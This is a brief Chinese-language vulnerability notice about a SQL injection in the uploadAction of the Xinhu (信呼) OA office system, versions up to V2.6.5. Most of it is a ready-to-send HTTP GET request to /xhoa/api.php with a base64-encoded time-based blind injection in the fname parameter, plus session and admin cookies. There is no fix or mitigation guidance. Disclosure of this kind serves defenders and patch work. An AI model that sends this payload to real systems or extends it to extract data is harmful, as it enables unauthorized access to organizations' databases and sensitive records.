**漏洞描述：**

信呼OA办公系统是一个开源的在线办公系统。 信呼OA办公系统uploadAction存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

**影响版本：**

<=V2.6.5

**Payload：**

```
GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1  
Host:  
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"  
Sec-Fetch-Dest: empty  
Accept: application/json, text/javascript, */*; q=0.01  
Referer: http://127.0.0.1:81/xhoa/  
Cookie: PHPSESSID=i5ikamdm9hso4724c57vn6h436; deviceid=1728559199539; xinhu\_mo\_adminid=pp0ke0kl0mfn0pw0ke0mfk0mmr0mfm0mfw0mlf0mfe0pp0ke0pe0mfo03; xinhu\_ca\_adminuser=admin; xinhu\_ca\_rempass=0  
Sec-Fetch-Mode: cors  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36  
Accept-Encoding: gzip, deflate, br, zstd  
Sec-Fetch-Site: same-origin  
Accept-Language: zh-CN,zh;q=0.9  
X-Requested-With: XMLHttpRequest  
sec-ch-ua-mobile: ?0  
sec-ch-ua-platform: "Windows" 
```

---
